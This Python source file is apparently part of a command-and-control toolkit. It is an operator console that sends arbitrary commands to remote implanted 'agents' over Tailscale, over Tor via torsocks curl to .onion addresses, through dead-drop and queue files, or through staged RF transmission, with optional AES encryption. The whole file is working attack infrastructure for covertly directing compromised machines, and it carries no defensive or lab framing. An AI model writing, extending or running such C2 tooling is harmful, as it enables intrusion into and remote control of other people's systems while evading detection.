#!/usr/bin/env python3
# Ruta: modules/c2/agent_commander.py

import os
import json
import argparse
import datetime
import base64
import hashlib
import socket
import requests
import subprocess
import uuid
from getpass import getpass
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from urllib.parse import urlencode

AGENT_PATH = "recon/agent_inventory.json"
QUEUE_DIR = "c2/queues"
LOG_DIR = "results"
KEY_ENV = "C2_AES_KEY"
DEAD_DROP_DIR = "c2/dead_drop"
TAILSCALE_IP_MAP = "recon/tailscale_peers.json"
ONION_ROUTE_FILE = "c2/tor_onion_list.txt"

os.makedirs(QUEUE_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(DEAD_DROP_DIR, exist_ok=True)

def load_agents():
    if not os.path.exists(AGENT_PATH):
        return {}
    with open(AGENT_PATH, "r") as f:
        return json.load(f)

def list_agents(agents):
    print("\n[+] Available Agents:")
    for idx, (agent, data) in enumerate(agents.items(), 1):
        ip = data.get("ip", "unknown")
        tailscale = data.get("tailscale_ip", "n/a")
        tor = data.get("onion", "n/a")
        print(f" {idx}. {agent} | IP: {ip} | Tailscale: {tailscale} | Tor: {tor}")

def hash_command(command):
    return hashlib.sha256(command.encode()).hexdigest()

def encrypt_command(command, key):
    key_bytes = hashlib.sha256(key.encode()).digest()
    cipher = AES.new(key_bytes, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(command.encode(), AES.block_size))
    iv = cipher.iv
    encrypted = base64.b64encode(iv + ct_bytes).decode()
    return encrypted

def write_command(agent, command, original_cmd, encrypted=False):
    queue_file = os.path.join(QUEUE_DIR, f"{agent}.queue")
    with open(queue_file, "a") as f:
        f.write(command + "\n")

    log_entry = {
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "agent": agent,
        "encrypted": encrypted,
        "command_hash": hash_command(original_cmd),
        "raw_command": "[ENCRYPTED]" if encrypted else original_cmd
    }

    log_file = os.path.join(LOG_DIR, f"c2_commands_{datetime.datetime.utcnow().strftime('%Y%m%d')}.jsonl")
    with open(log_file, "a") as f:
        f.write(json.dumps(log_entry) + "\n")

def write_dead_drop(agent, command):
    drop_file = os.path.join(DEAD_DROP_DIR, f"{agent}_{uuid.uuid4().hex[:6]}.txt")
    with open(drop_file, "w") as f:
        f.write(command + "\n")
    print(f"[+] Command dropped at {drop_file} (manual pickup or beacon-based fetch)")

def try_tailscale(agent, agents, command):
    ip = agents[agent].get("tailscale_ip")
    if not ip:
        return False
    try:
        url = f"http://{ip}:8080/command"
        r = requests.post(url, json={"cmd": command}, timeout=3)
        print(f"[Tailscale] Sent to {ip} - Status {r.status_code}")
        return True
    except:
        return False

def try_tor(agent, agents, command):
    onion = agents[agent].get("onion")
    if not onion:
        return False
    try:
        url = f"http://{onion}/command"
        tor_cmd = [
            "torsocks", "curl", "-X", "POST", "-d", urlencode({"cmd": command}), url
        ]
        result = subprocess.run(tor_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        print(f"[Tor] Sent to {onion} - Response: {result.stdout.decode().strip()}")
        return True
    except:
        return False

def try_rf(agent, command):
    rf_file = os.path.join("c2/rf_outbound", f"{agent}_{datetime.datetime.utcnow().timestamp()}.txt")
    os.makedirs(os.path.dirname(rf_file), exist_ok=True)
    with open(rf_file, "w") as f:
        f.write(command)
    print(f"[RF] Command staged for RF transmission at {rf_file}")
    return True

def smart_send(agent, agents, command, fallback=True):
    if try_tailscale(agent, agents, command):
        return
    if try_tor(agent, agents, command):
        return
    if fallback:
        try_rf(agent, command)
    else:
        write_command(agent, command, command, encrypted=False)

def main():
    parser = argparse.ArgumentParser(description="Send command to C2 agent")
    parser.add_argument("--agent", help="Agent ID (from inventory)")
    parser.add_argument("--cmd", help="Command to execute")
    parser.add_argument("--encrypt", action="store_true", help="Encrypt with AES key")
    parser.add_argument("--list", action="store_true", help="List agents")
    parser.add_argument("--route", choices=["auto", "queue", "dead_drop", "tailscale", "tor", "rf"], default="auto")

    args = parser.parse_args()
    agents = load_agents()

    if args.list:
        list_agents(agents)
        return

    if not args.agent or not args.cmd:
        print("[!] --agent and --cmd required.")
        return

    if args.agent not in agents:
        print(f"[!] Agent '{args.agent}' not found.")
        return

    encrypted = False
    final_cmd = args.cmd

    if args.encrypt:
        key = os.environ.get(KEY_ENV)
        if not key:
            key = getpass(f"AES key (or export {KEY_ENV}): ")
        final_cmd = encrypt_command(args.cmd, key)
        encrypted = True

    if args.route == "queue":
        write_command(args.agent, final_cmd, args.cmd, encrypted)
    elif args.route == "dead_drop":
        write_dead_drop(args.agent, final_cmd)
    elif args.route == "tailscale":
        try_tailscale(args.agent, agents, final_cmd)
    elif args.route == "tor":
        try_tor(args.agent, agents, final_cmd)
    elif args.route == "rf":
        try_rf(args.agent, final_cmd)
    else:  # auto
        smart_send(args.agent, agents, final_cmd)

if __name__ == "__main__":
    main()
